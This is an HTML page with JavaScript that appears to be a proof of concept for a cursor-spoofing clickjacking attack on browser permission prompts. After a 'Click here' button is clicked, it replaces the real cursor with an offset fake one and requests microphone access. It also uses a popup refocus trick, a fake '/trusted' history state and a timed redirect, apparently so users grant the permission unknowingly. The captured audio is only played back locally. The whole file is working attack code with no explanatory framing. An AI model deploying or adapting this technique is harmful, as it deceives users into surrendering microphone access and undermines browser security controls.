<!doctype html>
<html>
<head>
<meta charset="utf-8">
<style>
html, body {
  width: 100%;
  height: 100%;
}
img {
  pointer-events: none;
}
#button {
  position: absolute;
  top: 150px;
  left: 310px;
}
#panel {
  display:none;
}
</style>
</head>

<body>

<button id="button">Click here</button>
<img src="cursor.png" id="cursor" style="display:none">
<div id="panel"></div>

<script>
const cursor = document.getElementById("cursor");
const button = document.getElementById("button");
const panel  = document.getElementById("panel");

let fakeCursor = false;
let lastPos = [0,0];

/* =====================
   CURSOR HANDLING
===================== */
document.addEventListener("mousemove", e => {
  if (!fakeCursor) {
    document.body.style.cursor = "auto";
    cursor.style.display = "none";
    lastPos = [e.clientX, e.clientY];
  } else {
    setFakecursor(e.clientX, e.clientY);
  }
});

function setFakecursor(x, y) {
  cursor.style.display = "block";
  cursor.style.position = "absolute";
  cursor.style.top  = y + "px";
  cursor.style.left = x + "px";

  const cx = Math.max(Math.min(x - 118 - 155, 128), 0);
  const cy = Math.max(Math.min(y - 128 + 42, 128), 0);

  document.body.style.cursor =
    `url('overlay.png') ${cx} ${cy}, auto`;
}

/* =====================
   CLICK HANDLER
===================== */
button.addEventListener("mousedown", e =>
  setFakecursor(e.clientX, e.clientY)
);

button.onclick = () => {
  button.remove();
  fakeCursor = true;
  setFakecursor(...lastPos);

  /* 🔥 TRUSTED STATE */
  history.pushState({}, '', '/trusted');
  panel.style.display = 'block';

  /* microphone */
  useMicrophone(() => fakeCursor = false);

  /* refocus trick */
  const w = window.open("about:blank", null, "popup");
  setTimeout(() => w.close(), 100);
};

/* =====================
   PAGE LIFECYCLE REDIRECT
===================== */
window.addEventListener('pageshow', () => {
  requestAnimationFrame(() => {
    requestAnimationFrame(() => {
      setTimeout(() => {
        location.href = 'https://google.com:9090';
      }, 80);
    });
  });
});

/* =====================
   MICROPHONE ONLY
===================== */
function useMicrophone(callback) {
  navigator.mediaDevices.getUserMedia({ audio:true }).then(stream => {
    callback && callback();
    const ctx = new AudioContext();
    const mic = ctx.createMediaStreamSource(stream);
    mic.connect(ctx.destination);
    document.body.append("Playing back microphone audio...");
  });
}
</script>

</body>
</html>
